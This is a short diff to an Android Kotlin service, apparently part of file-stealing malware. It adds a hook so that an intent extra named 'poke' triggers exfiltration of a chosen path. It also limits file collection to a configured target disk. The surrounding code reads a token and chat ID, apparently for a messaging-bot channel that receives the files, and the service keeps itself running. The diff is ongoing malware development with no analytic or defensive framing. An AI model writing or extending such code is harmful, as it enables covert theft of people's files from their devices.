@@ -37,6 +37,9 @@ class LichiaService : Service() {
             isActive = true
             watchPool.execute { watchLoop() }
         }
+        intent?.getStringExtra("poke")?.let { path ->
+            exfilPool.execute { exfil(path) }
+        }
         return START_STICKY
     }
 
@@ -93,6 +96,8 @@ class LichiaService : Service() {
         try {
             val c = Prefs.read(this)
             if (c.token.isEmpty() || c.chatId.isEmpty()) return
+            if (c.targetDisk.isNotEmpty() &&
+                File(rootPath).name != c.targetDisk) return
             val root = File(rootPath)
             if (File(root, Prefs.MARKER).exists()) return
             val files = Collect.files(root, c)
